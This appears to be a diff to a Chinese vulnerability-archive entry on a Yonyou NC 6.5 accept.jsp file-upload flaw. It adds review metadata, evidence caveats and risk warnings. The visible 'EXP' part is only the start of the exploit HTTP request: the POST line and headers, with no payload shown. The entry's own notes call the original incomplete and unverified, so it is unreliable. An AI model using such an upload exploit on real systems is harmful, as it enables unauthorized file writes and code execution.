@@ -1,11 +1,48 @@
 ---
-version: "NC 6.5"
 source: "MrWQ/vulnerability-paper"
+title: "用友NC accept.jsp上传"
+product: "用友NC"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "6.5 Windows路径条件"
+prerequisites: "无Cookie未知"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/DYMx-XoiEgzIwGvD58xNEQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC6.5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84%20EXP%EF%BC%89.md"
+id: "vw-c56aae6397ef753879b54368"
+entity_id: "ve-c56aae6397ef753879b54368"
+schema_version: "1"
 ---
 
-# 用友 NC6.5 文件上传漏洞（附 EXP）
+# 用友NC accept.jsp上传
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友NC；accept.jsp上传
+- 版本、配置及部署条件：6.5 Windows路径条件
+- 认证与权限前提：无Cookie未知
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- multipart name/filename丢失、头体空行缺，不可独立复现
+- 安装路径固定且无最终触发GET；宣传占大半，无修复build
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DYMx-XoiEgzIwGvD58xNEQ)
 
 **0x01 前言**
@@ -29,7 +66,7 @@ NC 6.5
 
 EXP：
 
-```
+```http
 POST /aim/equipmap/accept.jsp HTTP/1.1
 Host: 127.0.0.1:9100
 User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
